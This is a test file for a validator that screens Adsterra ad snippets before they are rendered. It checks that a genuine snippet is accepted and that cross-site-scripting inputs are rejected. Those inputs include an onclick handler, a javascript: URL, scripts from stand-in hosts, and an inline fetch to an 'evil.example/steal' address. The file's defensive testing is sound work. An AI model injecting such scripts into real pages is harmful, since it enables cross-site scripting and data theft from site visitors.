import assert from 'node:assert/strict';
import test from 'node:test';

import { renderAdsterraSnippet } from './adsterra-snippet.server';

test('renderAdsterraSnippet accepts restricted Adsterra zone snippets', () => {
  const result = renderAdsterraSnippet(
    `<script type="text/javascript">
      atOptions = {
        key: 'abc',
        format: 'iframe',
        height: 250,
        width: 300
      };
    </script>
    <script type="text/javascript" src="https://www.highperformanceformat.com/abc/invoke.js"></script>
    <div id="container-abc"></div>`,
    'test-zone'
  );

  assert.equal(result.ok, true);
});

test('renderAdsterraSnippet rejects event handler attributes', () => {
  const result = renderAdsterraSnippet(
    '<div onclick="alert(1)"></div>',
    'test-zone'
  );

  assert.equal(result.ok, false);
});

test('renderAdsterraSnippet rejects javascript URLs', () => {
  const result = renderAdsterraSnippet(
    '<script src="javascript:alert(1)"></script>',
    'test-zone'
  );

  assert.equal(result.ok, false);
});

test('renderAdsterraSnippet rejects unknown script hosts', () => {
  const result = renderAdsterraSnippet(
    '<script src="https://evil.example/invoke.js"></script>',
    'test-zone'
  );

  assert.equal(result.ok, false);
});

test('renderAdsterraSnippet rejects .pl lookalike hosts', () => {
  const result = renderAdsterraSnippet(
    '<script src="https://evil.pl/invoke.js"></script>',
    'test-zone'
  );

  assert.equal(result.ok, false);
});

test('renderAdsterraSnippet rejects arbitrary inline JavaScript', () => {
  const result = renderAdsterraSnippet(
    '<script>fetch("https://evil.example/steal")</script>',
    'test-zone'
  );

  assert.equal(result.ok, false);
});
